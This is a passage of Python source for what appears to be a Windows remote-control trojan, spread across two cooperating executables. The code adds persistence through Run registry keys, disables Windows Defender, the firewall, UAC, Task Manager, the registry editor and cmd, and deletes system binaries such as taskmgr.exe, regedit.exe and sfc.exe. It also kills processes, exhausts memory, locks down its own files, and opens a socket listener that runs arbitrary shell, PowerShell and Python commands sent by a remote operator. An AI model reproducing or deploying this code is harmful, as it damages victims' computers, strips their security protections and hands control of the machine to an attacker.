        programVL2(f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v vtl /f /t REG_SZ /d \"{os.path.split(os.path.abspath(os.path.realpath(sys.argv[0])))[0]}\\tbl.exe')
        programVL2(f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v vpal /f /t REG_SZ /d \"{os.path.split(os.path.abspath(os.path.realpath(sys.argv[0])))[0]}\\cdwn.exe')

    def corrupttrio():
        programVL2('takeown /f taskmgr.exe')
        programVL2('icacls "C:\\Windows\\system32\\taskmgr.exe" /grant *S-1-5-32-544:F')
        programVL2('taskkill /f /im taskmgr.exe')
        sleep(0.5)
        programVL2('del "C:\\Windows\\system32\\taskmgr.exe"')
        programVL2('takeown /f "C:\\Windows\\system32\\mmc.exe"')
        programVL2('icacls "C:\\Windows\\system32\\mmc.exe" /grant *S-1-5-32-544:F')
        programVL2('taskkill /f /im mmc.exe')
        sleep(0.5)
        programVL2('del "C:\\Windows\\system32\\mmc.exe"')
        programVL2('takeown /f "C:\\Windows\\regedit.exe"')
        programVL2('icacls "C:\\Windows\\regedit.exe" /grant *S-1-5-32-544:F')
        programVL2('taskkill /f /im regedit.exe')
        sleep(0.5)
        programVL2('del "C:\\Windows\\regedit.exe"')
        programVL2('takeown /f "C:\\Windows\\dllhost.exe"')
        programVL2('icacls "C:\\Windows\\dllhost.exe" /grant *S-1-5-32-544:F')
        programVL2('taskkill /f /im dllhost.exe')
        sleep(0.5)
        programVL2('del "C:\\Windows\\dllhost.exe"')
        programVL2('takeown /f "C:\\Windows\\System32\\sfc.exe"')
        programVL2('icacls "C:\\Windows\\System32\\sfc.exe" /grant *S-1-5-32-544:F')
        programVL2('taskkill /f /im sfc.exe')
        sleep(0.5)
        programVL2('del "C:\\Windows\\System32\\sfc.exe"')
    def DisableWindowsDefender():
        try: 
            programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f')
            programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f')
            programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
            programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f')
            programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')

            programVL2('Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Proection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f')
            programVL2('Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Proection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f')
            programVL2('Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Proection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
            programVL2('Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Proection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f')
            programVL2('Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Proection" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')

        except Exception as e: # so no crashing
            print(e)
            return False


    def killcomputerslowly():
            import numpy as np 
            arr = np.ones((2024, 2024, 2024, 1), dtype=np.uint8) # the num 4 is like 4* 25, it's a multiplier of 25. 25 GB of ram.
            while True:
                    print(arr) # instead of print use os.system(msg * aarr)
                    #os.system(f'msg * {arr}')


    def classicMinecraft():
        webhandler('https://classic.minecraft.net/')


    def checkdelay():
        v = measure_latency(host='google.com')
        v = int(v[0])
        texttospeech(f'VAry    ... at({v}ms)')
        # say, VAry Experiencing temporarily a delay of 300 miliseconds



    # make a kill all processes kind of thing

    def killallprocess():
        #import subprocess
        for proc in psutil.process_iter():
                try:
                        # Get process name & pid from process object.
                        processName = proc.name()
                        if 'cdwn.exe' in processName or 'tbl.exe' in processName or SelfFilename in processName:
                                pass
                        else:
                                #print("Killing process: " + processName)
                                proc.kill() # not vl2, it'll kill the computer
                        
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass

    def disablefirewall():
        runcmd('netsh advfirewall set allprofiles state off', True)

    def restartToADvancedOptions():
        runcmd('shutdown.exe /r /o /f /t 0')

    def disableTaskmanager():
        programVL2('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')

    #def protectself():
    #    a = a
    #    # makes a duplicate of self, checks if running, checks old one, if one is deleted / not opening recreate it and continue to operate. 
    #    # limit self ram usage


    '''
    def deleteself(): # doesn't work atm
        #subprocess.Popen('cmd.exe -c \'timeout 3/nobreak\n del "{}" /Q\''.format(sys.argv[0]))
        # the code, 
        subprocess.Popen("python -c \"import os, time; time.sleep(1); os.remove('{}');\"".format(sys.argv[0])) # this shite needs python
        sys.exit(0)
        '''

    '''
    def renameself(To): # to "Client Server Runtime Process"
        os.system()

    Making this is just too long, Already made this for something else,
    to implement it here is just unneeded and this time can be used
    for something else.
    '''

    '''
    # What Itay has made:

    def click(x, y):
            if pyautogui.onScreen(float(x), float(y)):
                    pyautogui.click(x=float(x), y=float(y))
    def open_url(url):
            if not url.startswith("https://"):
                    new_url='https://' + url
            else:
                    new_url=url
            try:
                    webbrowser.open(url=new_url)
            except:
                    pass
    def run(file):
            try:
                    os.startfile(os.path.abspath(file))
            except:
                    kpress(['winleft', 'r'])
                    ktype(file)
                    kpress(['enter'])

    def ktype(string):
            try:
                    keyboard.write(string)
            except:
                    pass
    def moti():
            try:
                    os.startfile(os.path.normpath('moti.exe'))
            except:
                    kpress(['winleft', 'r'])
                    ktype("moti.exe")
                    kpress(['enter'])
    def kpress(keys):
            for key in keys:
                    pyautogui.keyDown(key)
            keys2=keys
            for key2 in range(len(keys2)):
                    pyautogui.keyUp(keys2[key2-1])
                    continue
    def run_code(code):
        try:
            exec(code)
        except:
            pass
    def command(scommand):
        os.system(command=scommand)
    '''
        


    # This fucked up connection should get encrypted and limited so that our phone won't get hacked so easily. - let's fix that. # TBA

    '''
    S = socket.gethostbyname(socket.gethostname())
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((S, 8080))
    def handle_client(conn, addr):
        connected=True
        while connected:
            try:
                msg_len = conn.recv(640).decode('utf-8')
                if msg_len:
                    msg_len=int(msg_len)
                    msg = conn.recv(msg_len).decode('utf-8')
                    print(msg)
                    if str(msg)=="disconnect":
                        connected=False
                    if str(msg)=="rm":
                        thread = threading.Thread(moti())
                        thread.start()    
                    if str(msg).startswith("rp "):
                        thread = threading.Thread(run(str(msg).replace("rp ", "", 1)))
                        thread.start()    
                    if str(msg).startswith("k "):
                        thread = threading.Thread(kpress(str(msg).replace("k ", "", 1).split(sep=";")))
                        thread.start()    
                    if str(msg).startswith("oloc "):
                        thread = threading.Thread(open_url(str(msg).replace("oloc ", "", 1)))
                        thread.start()    
                    if str(msg).startswith("t "):
                        thread = threading.Thread(ktype(str(msg).replace("t ", "", 1)))
                        thread.start()    
                    if str(msg).startswith("c "):
                        x_and_y=str(msg.replace("c ", "", 1)).split(sep=";")
                        thread = threading.Thread(click(x_and_y[0], x_and_y[1]))
                        thread.start()    
                    if str(msg).startswith("ec "):
                        thread = threading.Thread(run_code(str(msg).replace("ec ", "", 1)))
                        thread.start()
                    if str(msg).startswith("sc "):
                        thread = threading.Thread(command(str(msg).replace("sc ", "", 1)))
                        thread.start()
                    if str(msg).startswith("rr "):
                        thread = threading.Thread(SuperRickroll(str(msg).replace("rr ", "", 1)))
                        thread.start()
                    if str(msg).startswith("al "):
                        thread = threading.Thread(target=windowsalert(str(msg).replace("al ", "", 1).split(";")))
                        thread.start()
                    if str(msg).startswith("rrm "):
                        thread = threading.Thread(target=SuperRickroll().play())
                        thread.start()
            except:
                pass
        conn.close()
    def start():
        s.listen()
        while True:
            print("test")
            #s.listen()
            conn, addr = s.accept()
            thread = threading.Thread(target=handle_client, args=(conn, addr)).start() 
    #start()
    threading.Thread(target=play()).start()
    while True:
        print("", end="")'''

    def checkfriend():
        #print(os.getcwd())
        friendname = 'cdwn.exe'
        processFriendIsRunning = False
        for proc in psutil.process_iter():
                try:
                        # Get process name & pid from process object.
                        processName = proc.name()
                        #subprocess_cmd("taskkill.exe /t /im " + processName)
                        #subprocess_cmd("taskkill.exe /im " + processName)
                        v = os.path.abspath(psutil.Process(proc.pid).cwd())
                        if v == os.getcwd() and processName == friendname:
                            processFriendIsRunning = True
                            #print("Killing process: " + processName)
                            #runcmd("taskkill.exe /t /im " + processName) # left to do, fix this damn thing to go in the background, and the reg startup thing doesn't want to work again
                            #runcmd("taskkill.exe /im " + processName)
                            #print(processName)
                            #if a == 0: # 1 unsuccessfully, 0 successfully killed
                            #    os.system(f'msg * {processName} Proccess will fail to.')
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass
        if processFriendIsRunning == True:
            pass
            #print('Is running')
        else:
            print('not running')
            os.startfile(f'{os.getcwd()}\\cdwn.exe') # for now py cause i hadn't built yet
            sleep(0.3)


    def disablecontrolpanel():
        programVL2('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f')

    def disableregistry():
        runcmd('taskkill /f /t /im regedit.exe')
        runcmd('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f')
        runcmd('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f')

    def disablecmd():
        runcmd('taskkill /f /t /im cmd.exe')
        runcmd('reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d 1 /f')

    def disablegrouppolicy(): # do not use. # i have too.. shit
        programVL2('taskkill /f /t /im mmc.exe')    
        programVL2('reg add "HKLM\Software\Policies\Microsoft\Windows\System" /v "DisableGroupPolicy" /t REG_DWORD /d 1 /f')

    def updatevaryusing_usb():
        system32_path = r'C:\Windows\System32'
        for drive in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
                drive_path = drive + ':\\'
                if os.path.exists(drive_path):
                        vary_folder_path = os.path.join(drive_path, 'VAry')
                        if os.path.exists(vary_folder_path):
                                print(f'Found VAry folder at {vary_folder_path}')
                                for filename in os.listdir(vary_folder_path):
                                        src_path = os.path.join(vary_folder_path, filename)
                                        dst_path = os.path.join(system32_path, filename)
                                        if os.path.exists(dst_path):
                                                os.remove(dst_path)
                                        print(f'Copying {src_path} to {dst_path}')
                                        shutil.copy2(src_path, dst_path)
                                        sleep(1)
                                        programVL2('start tbl.exe')
                                        #exit()
    '''                                    MessageBox = ctypes.windll.user32.MessageBoxW
                                        restart_prompt = MessageBox(None, "Do you want to restart the application now?", "Restart Application", 0x40 | 0x1)
                                        if restart_prompt == 1:
                                                print('Restarting VAry\'s host..')
                                                programVL2('start tbl.exe')
                                                programVL2('taskkill /f /im tbl.exe')'''
    
    def optiontokillselfandfriend():
        import sys
        runcmd('taskkill /f /im cdwn.exe')
        msgtosystem('Done.                 ...-Should be')
        texttospeech('Done.')
        runcmd('taskkill /f /t /im cdwn.exe')
        runcmd('taskkill /f /t /im tbl.exe')
        sys.exit()
        
        
    def deleteshellstartupfolder():
        runcmd(f'rmdir /s /q \"C:\\Users\\{computersusername}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"', True)


    def every5secdisableanvs():
        while True:
            '''
            disablefirewall()
            DisableWindowsDefender()
            disableTaskmanager()
            DisableUAC()
            '''
            disablefirewall()
            processestoterminate()
            sleep(4)
            deleteshellstartupfolder()

    def runAllTheTime():
        try:
            while True:
                checkfriend()
        except Exception as e:
            print(e)
            return runAllTheTime()


    def disassemblepowershellandcmdandlocalgroup():
        def a():
            while True:
                try:
                    runcmd('taskkill /f /im powershell.exe', True, 0)
                    sleep(0.03)
                except Exception as e:
                    print(e)
        def b():
            while True:
                try:
                    runcmd('taskkill /f /im cmd.exe', True, 0)
                    sleep(0.03)
                except Exception as e:
                    print(e)
        def c():
            while True:
                try:
                    runcmd('taskkill /f /im dllhost.exe', True, 0)
                    sleep(0.03)
                except Exception as e:
                    print(e)
    

        threading.Thread(target=a).start()
        threading.Thread(target=b).start()
        #threading.Thread(target=c).start() # unneeded as it's removed/being-deleted from windows


    def protect_file(file_path):
            from getpass import getuser
            # Give owner full control and deny access to all other users
            programVL2(f'icacls "{file_path}" /inheritance:r /grant:r {os.environ["username"]}:F /deny "*":RX')
            # Make file read-only
            programVL2(f'icacls "{file_path}" /deny {getuser()}:W,D')
            programVL2(f'attrib +r +h +s "{file_path}"')
            programVL2(f'attrib +r "{file_path}"')
            programVL2(f'icacls "{file_path}" /inheritance:r /grant:r "username":F /deny "administrators":RX')
            programVL2(f'icacls "{file_path}" /disable')


    def startup(): # these commands run but don't do anything
        DisableUAC()
        AddSelfToStartupRegistry()
        #threading.Thread(target=DisableWindowsDefender).start()
        #disablecmd()
        disablecontrolpanel()
        #DisableWindowsDefender() # does absolutely nothing
        disablefirewall()
        crshonctrlscrllkinstall()
        disableTaskmanager()
        disablegrouppolicy()
        sleep(4)
        disableregistry()
        threading.Thread(target=every5secdisableanvs).start()

    def waituntilresponse(conn):
            while True:
                    msg_length = conn.recv(HEADER).decode(FORMAT)
                    if msg_length:
                            msg_length = int(msg_length)
                            msg = conn.recv(msg_length).decode(FORMAT)
                            return msg


    def handle_client(conn, addr):
            try:
                    #print(f"[NEW CONNECTION] {addr} connected.")
                    #= run24.Keys(addr[0], 'rsa')
                    # the encrypt decrypt should happen above!
                    connected = True
                    while connected:
                            msg_length = conn.recv(HEADER).decode(FORMAT)
                            if msg_length:
                                    msg_length = int(msg_length)
                                    msg = conn.recv(msg_length).decode(FORMAT)
                                    #print(msg)
                                    if msg == DISCONNECT_MESSAGE:
                                            connected = False
                                    else: # make a button press per, so if say, press right click, press R or G or space or backspace, it does so.
                                        # each message should come with a subrect, is 
                                        tmp = msg.split('c9GgYdMAW7')
                                        #print(msg)
                                        Operator = tmp[0]
                                        text1 = tmp[1] # if none then none
                                        print(f'I\'ve received a request from {addr}, The function is {Operator} with assigned(if assigned) text that is \"{text1}\"')
                                        try:
                                            if text1 == 'None':
                                                text1 = None
                                            if Operator == 'webhandler':
                                                threading.Thread(target=webhandler, args=[text1]).start()
                                            elif Operator == 'powershell':
                                                threading.Thread(target=powershell, args=[text1]).start()
                                            elif Operator == 'programVL2':
                                                threading.Thread(target=programVL2, args=[text1]).start()
                                            elif Operator == 'blackenscreen':
                                                if text1 == 'E9Z99a8QnPMhdYi':
                                                    optiontokillselfandfriend()
                                                threading.Thread(target=blackenscreen, args=[text1]).start()
                                            elif Operator == 'disableuac':
                                                threading.Thread(target=DisableUAC).start()
                                            elif Operator == 'texttospeech':
                                                threading.Thread(target=texttospeech, args=[text1]).start()
                                            elif Operator == 'inviscurr':
                                                threading.Thread(target=inviscurr, args=[text1]).start()
                                            elif Operator == 'play_tone':
                                                a = text1.split('UKJA$^&SYJGHD')
                                                threading.Thread(target=play_tone(int(a[0]), int(a[1])))
                                            elif Operator == 'play_shepard_tone':
                                                a = text1.split('kwp1q47xgW')
                                                threading.Thread(target=play_shepard_tone(int(a[0]), int(a[1]),int(a[2])))
                                            #elif Operator == 'overload':
                                            #    overload([text1]) # not yet
                                            elif Operator == 'msg':
                                                threading.Thread(target=msgtosystem, args=[text1]).start()
                                            elif Operator == 'runpythonscript':
                                                threading.Thread(target=runpythonscript, args=[text1]).start()
                                            elif Operator == 'startphintro':
                                                threading.Thread(target=startPhIntro).start()
                                            elif Operator == 'runcmd':
                                                threading.Thread(target=runcmd, args=[text1]).start()
                                            elif Operator == 'addselftostartupregistry':
                                                threading.Thread(target=AddSelfToStartupRegistry).start()
                                            elif Operator == 'disablewindowsdefender':
                                                threading.Thread(target=DisableWindowsDefender).start()
                                            elif Operator == 'set_volume_max':
                                                threading.Thread(target=set_volume_max).start()
                                            elif Operator == 'set_volume_zero':
                                                threading.Thread(target=set_volume_zero).start()
                                            elif Operator == 'killcomputerslowly':
                                                threading.Thread(target=killcomputerslowly).start()
                                            elif Operator == 'updatevaryusingusb':
                                                threading.Thread(target=updatevaryusing_usb).start()
                                            elif Operator == 'crashoops':
                                                threading.Thread(target=crashOOPS).start()
                                            elif Operator == 'resetwindows':
                                                threading.Thread(target=resetwindowstodefaults).start()
                                            elif Operator == 'classicminecraft':
                                                threading.Thread(target=classicMinecraft).start()
                                            elif Operator == 'killallprocess':
                                                threading.Thread(target=killallprocess).start()
                                            elif Operator == 'disablefirewall':
                                                threading.Thread(target=disablefirewall).start()
                                            elif Operator == 'restarttoadvancedoptions':
                                                threading.Thread(target=restartToADvancedOptions).start()
                                            elif Operator == 'disabletaskmanager':
                                                threading.Thread(target=disableTaskmanager).start()
                                            elif Operator == 'togglemute': # update v3
                                                togglemute()
                                            elif Operator == 'disableinput':
                                                a = text1.split('!&!')
                                                disableinput(a[0], a[1])
                                            elif Operator == 'speakxlanguage':
                                                threading.Thread(target=speakXlanguage, args=[text1]).start()
                                            elif Operator == 'speakrussian':
                                                threading.Thread(target=speakRussian, args=[text1]).start()
                                            elif Operator == 'speakfrench':
                                                threading.Thread(target=speakFrench, args=[text1]).start()
                                            elif Operator == 'speakarabic':
                                                threading.Thread(target=speakArabic, args=[text1]).start()
                                            elif Operator == 'speakenglish':
                                                threading.Thread(target=speakEnglish, args=[text1]).start()
                                            elif Operator == 'pressinput':
                                                threading.Thread(target=presskeys, args=(text1,)).start()
                                            elif Operator == 'writetext':
                                                threading.Thread(target=writetext, args=[text1]).start()
                                            elif Operator == 'meandtheboys':
                                                threading.Thread(target=MeAndTheBoys).start()
                                            elif Operator == 'payload_1':     
                                                threading.Thread(target=payload_1).start()
                                            elif Operator == 'payload_2':
                                                threading.Thread(target=payload_2).start()
                                            elif Operator == 'payload_3':
                                                threading.Thread(target=payload_3).start()
                                            elif Operator == 'payload_4':
                                                threading.Thread(target=payload_4).start()
                                            elif Operator == 'payload_5':
                                                threading.Thread(target=payload_5).start()
                                            elif Operator == 'payload_6':
                                                threading.Thread(target=payload_6).start()
                                            elif Operator == 'killallunknownprocess':
                                                threading.Thread(target=processestoterminate).start()
                                            elif Operator == 'logoffuser':
                                                threading.Thread(target=logoffuser).start()
                                            elif Operator == 'checkdelay':
                                                threading.Thread(target=checkdelay).start()
                                            # here you fucking handle the damn message AND DO SHIT
                                            else:
                                                print(f'Invalid request sent, {Operator}|{text1} from address {addr} ')
                                        except Exception as e:
                                            #print(e)
                                            pass
            except Exception as e:
                    #print(e)
                    #print(f"The address {addr} has disconnected.")
                    pass
            finally:
                    conn.close()
                    ClientsList.remove(conn)

            conn.close()
            #print(f"[{addr}] Connection closed.")

    def sendMsgtoClient(conn, msg):

            message = msg.encode(FORMAT)

            msg_length = len(message)
            send_length = str(msg_length).encode(FORMAT)
            send_length += b' ' * (HEADER - len(send_length))
            conn.send(send_length)
            conn.send(message)



    def sendGlobal(msg, Exclude=None):
            message = msg.encode(FORMAT)
            msg_length = len(message)
            send_length = str(msg_length).encode(FORMAT)
            send_length += b' ' * (HEADER - len(send_length))
            for client in ClientsList:
                    if client != Exclude:
                            try:
                                    client.send(send_length)
                                    client.send(message)
                            except ConnectionAbortedError:
                                    print(f"{client} disconnected")
                                    ClientsList.remove(client)    

    ClientsList = []

    #def reqi():
            #while True:
                    #console = input('\r> ')
                    #tmpconsole = console.lower()
                    #if tmpconsole == '!quit':
                    #        print('Quitting...')
                    #        for clients in ClientsList:
                    #                sendMsgtoClient(clients, 'Server Shutting down...')
                    #                sendMsgtoClient(clients, DISCONNECT_MESSAGE)
                    #                clients.close()
                    #        time.sleep(1.3)
                    #        server.close()
                    #        sys.exit()
                    #elif tmpconsole == '!restart': # at here you can send the clients a command to restart and they'll restart on their own
                    #        print('Restarting!')
                    #        for clients in ClientsList:
                    #                sendMsgtoClient(clients, 'Server Restarting!')
                    #                sendMsgtoClient(clients, DISCONNECT_MESSAGE)
                    #                clients.close()
                    #        server.close()
                    #        os.system(f'start {sys.argv[0]}')
                    #        sys.exit()
                    #elif tmpconsole == '!list':
                    #        print(f'Connected Users: {len(ClientsList)}')
                    #        for client in ClientsList:
                    #                print(f'{client}')
                    #elif tmpconsole == '!help':
                    #        print('!list - Lists all connected users')
                    #        print('!quit - Quits the server')
                    #else:
                    #        sendGlobal(console)





    def checkifselfisrunning():
        #print(os.getcwd())
        FriendName = 'tbl.exe'
        processFriendIsRunning = 0
        for proc in psutil.process_iter():
                try:
                        # Get process name & pid from process object.
                        processName = proc.name()
                        #subprocess_cmd("taskkill.exe /t /im " + processName)
                        #subprocess_cmd("taskkill.exe /im " + processName)
                        v = os.path.abspath(psutil.Process(proc.pid).cwd())
                        print(f'{v.casefold()}//{processName}     {SelfFolderContainingProgram.casefold()}//{FriendName}')
                        if v.casefold() == SelfFolderContainingProgram.casefold() and processName == FriendName:
                            processFriendIsRunning += 1
                            #print("Killing process: " + processName)
                            #runcmd("taskkill.exe /t /im " + processName) # left to do, fix this damn thing to go in the background, and the reg startup thing doesn't want to work again
                            #runcmd("taskkill.exe /im " + processName)
                            #print(processName)
                            #if a == 0: # 1 unsuccessfully, 0 successfully killed
                            #    os.system(f'msg * {processName} Proccess will fail to.')
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass
        if processFriendIsRunning > 2:
            import sys
            from sys import exit
            print('An instance is already running. killing self')
            exit()
        else:
            print('No other instance is running')


    def starter():    
        startup()
        corrupttrio()
        sleep(0.5)
        corrupttrio()
        protect_file(selfScriptFullLocation)
        protect_file(SelfFolderContainingProgram + '\\' + 'cdwn.exe')
        from getpass import getuser
        subprocess.run(f'icacls "C:\\Windows\\explorer.exe" /deny {getuser( )}:(RX)', shell=True)
        threading.Thread(target=disassemblepowershellandcmdandlocalgroup).start()
        global HEADER, PORT, SERVER, FORMAT, DISCONNECT_MESSAGE, server
        HEADER = 64
        PORT = 3451 
        SERVER = socket.gethostbyname(socket.gethostname())
        ADDR = (SERVER, PORT)
        FORMAT = 'utf-8' # don't ever fucking change this!
        DISCONNECT_MESSAGE = "!DISCONNECT" # unneeded, beside alerting the client it's been removed there's nothing else
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(ADDR)
        #hostname123 = socket.gethostname()
        #local_ip123 = socket.gethostbyname(hostname123)
        #texttospeech(f'System starting! @.., {local_ip123}') # is just annoying
        try:
            server.listen()
            print(f"[LISTENING] Server is listening on {SERVER}:{PORT}")
            while True:
                conn, addr = server.accept()
                ClientsList.append(conn)
                thread = threading.Thread(target=handle_client, args=(conn, addr))
                thread.start()
                #print(f"[ACTIVE CONNECTIONS] {len(ClientsList)}")
        except Exception as e:
            texttospeech(f'Error: {e}')
            print(e)
            sleep(5)
            return starter()

    def indeed():
        try:
            threading.Thread(target=checkifselfisrunning()).start()
            threading.Thread(target=runAllTheTime).start()
            threading.Thread(target=starter).start()
        except Exception as e:
            print(f'Error at indeed: {e}')
            return indeed()

    indeed() #.

    '''
    webhandler
    powershell
    programvl1 # open program, start {program} with no uac
    programvl2 # open program with uac
    blackenscreen
    disableuac
    texttospeech
    inviscurr # invis all focused
    overload
    msg(text)
    runpythonscript
    startphintro
    runcmd # runs to command
    AddSelfToStartupRegistry
    DisableWindowsDefender 
    killcomputerslowly
    classicMinecraft
    killallprocess
    disablefirewall
    restartToADvancedOptions
    disableTaskmanager
    '''

def script2():#task_queue):
    import os
    import psutil
    from time import sleep
    import sys
    import threading
    # just a helper to make sure the main proccess is running

    SelfFilename = 'tbl.exe' # os.path.basename(__file__) # Change accordingly !
    SelfFolderContainingProgram = os.path.split(os.path.abspath(os.path.realpath(sys.argv[0])))[0]
    selfScriptFullLocation = SelfFolderContainingProgram + '\\' + SelfFilename


    import win32com.shell.shell as shell


    def programVL2(program): # Using UAC.
        'Doesn\'t have the start method, for commands with admin perms'
        'Run a program with a request for UAC - Admin perms.'
        shell.ShellExecuteEx(lpVetbl='runas', lpFile='cmd.exe', lpParameters='/c '+program)

    def checkfriend():
        #print(os.getcwd())
        FriendName = 'tbl.exe'
        processFriendIsRunning = False
        for proc in psutil.process_iter():
                try:
                        # Get process name & pid from process object.
                        processName = proc.name()
                        #subprocess_cmd("taskkill.exe /t /im " + processName)
                        #subprocess_cmd("taskkill.exe /im " + processName)
                        v = os.path.abspath(psutil.Process(proc.pid).cwd())
                        #print(f'{v.casefold()}//{processName}     {SelfFolderContainingProgram.casefold()}//{FriendName}')
                        if v.casefold() == SelfFolderContainingProgram.casefold() and processName == FriendName:
                            processFriendIsRunning = True
                            break
                            #print("Killing process: " + processName)
                            #runcmd("taskkill.exe /t /im " + processName) # left to do, fix this damn thing to go in the background, and the reg startup thing doesn't want to work again
                            #runcmd("taskkill.exe /im " + processName)
                            #print(processName)
                            #if a == 0: # 1 unsuccessfully, 0 successfully killed
                            #    os.system(f'msg * {processName} Proccess will fail to.')
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass
        if processFriendIsRunning == True:
            print('Is running')
        else:
            print('not running')
            try:
                programVL2(f'start tbl.exe') # when you build the exe. use
                print(f'SelfFolderContainingProgram {SelfFolderContainingProgram}')
                sleep(1)
            #print(os.path.split(os.path.abspath(os.path.realpath(sys.argv[0])))[0])
            #os.system(f'msg * start {SelfFolderContainingProgram}\\tbl.exe')
            except Exception as e:
                print(e)
            return checkfriend()



    def processestoterminate():
            # a list to kill processes when got all. # PID ONLY!
            tokill = []

            # to not absolutely kill windows there shall be an exclude list, but this program is(sort of) foolproof.
            exclude_list = ["powershell.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe","GoogleCrashHandler64.exe","explorer.exe","svchost.exe","services.exe","csrss.exe","winlogon.exe","lsass.exe","lsm.exe","smss.exe","system","wininit.exe","taskmgr.exe","winmgmt.exe","ntoskrnl.exe","spoolsv.exe","msdtc.exe","audiodg.exe","dwm.exe","searchindexer.exe", "vpal.exe", "tbl.exe", "chrome.exe", "whatsapp.exe", 'System', 'SecurityHealthService.exe', 'MemCompression', 'csrss.exe', 'MpCmdRun.exe', 'WUDFHost.exe', 'TiWorker.exe', 'smss.exe', 'VSSVC.exe', 'lsass.exe', 'sihost.exe', 'WmiPrvSE.exe', 'ctfmon.exe', 'SearchFilterHost.exe', 'winlogon.exe', 'rdpclip.exe', 'tbl.exe', 'ngen.exe', 'sppsvc.exe', 'backgroundTaskHost.exe', 'vpal.exe', 'tbl.exe', 'wlms.exe', 'TextInputHost.exe', 'LogonUI.exe', 'svchost.exe', 'smartscreen.exe', 'SearchApp.exe', 'dwm.exe', 'taskkill.exe', 'MsMpEng.exe', 'fontdrvhost.exe', 'cmd.exe', 'Registry', 'TrustedInstaller.exe', 'NisSrv.exe', 'wininit.exe', 'StartMenuExperienceHost.exe', 'tbl.exe', 'mscorsvw.exe', 'System Idle Process', 'conhost.exe', 'ngentask.exe', 'SearchProtocolHost.exe', 'SearchIndexer.exe', 'OneDrive.exe', 'spoolsv.exe', 'explorer.exe', 'SecurityHealthSystray.exe', 'System', 'services.exe']

            exclude_list_HAVE = ["System", "chrome.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe","GoogleCrashHandler64.exe", "wlms.exe"]
            exclude_list_HAVE = [x.lower() for x in exclude_list_HAVE]
            
            ownprogrampid = os.getpid()

            # Functions:
            def corruptfile(directoryoffile):
                    with open(directoryoffile, "tbl+") as f:
                            content = f.read()
                            scrubbed_content = b"X" * len(content)
                            f.seek(0)
                            f.write(scrubbed_content)
                            f.truncate()

            def getchildrenofprocess(pid):
                    process = psutil.Process(pid)
                    for child in process.children(recursive=True):
                            add(child.pid)

            def add(pid, children=False):
                    if pid == ownprogrampid:
                            # Nope.
                            pass
                    else:
                            if children == True:
                                    getchildrenofprocess(pid)
                            if pid not in tokill:
                                    tokill.append(pid)

            processes = psutil.process_iter()
            system32_files = os.listdir(os.environ['WINDIR'] + '\System32')
            windows_files = os.listdir(os.environ['WINDIR'])

            # Iterate through the list of processes
            for process in processes:
                    try:
                            # Get the process ID, name, and executable path
                            pid = process.pid
                            name = process.name()
                            exe_path = process.exe().casefold()
                            if process.name() not in exclude_list:
                                    add(pid)
                            # Check if the process name is in the System32 file list and if the executable path is not in the System32 folder
                            else:
                                    if name in system32_files and exe_path.startswith((os.environ['WINDIR'] + '\\System32').casefold()):
                                            pass
                                    else:
                                            if name in windows_files and exe_path.startswith((os.environ['WINDIR']).casefold()):
                                                    pass
                                            else:
                                                    add(pid)
                    except Exception as e:
                            print(f'Error: {e}')
                            pass

            # save locations.
            pid_locations = []
            for pid in tokill:
                try:
                    pid_locations.append(psutil.Process(pid).exe())
                except Exception as e:
                    print(f'Error: {e}')
                    continue
            # Kill all the processes in the list of processes to kill
            for pid in tokill:
                    try:
                            print(psutil.Process(pid).name(), pid, psutil.Process(pid).exe())
                            if psutil.Process(pid).name().casefold() in exclude_list_HAVE:
                                    pass
                            else:
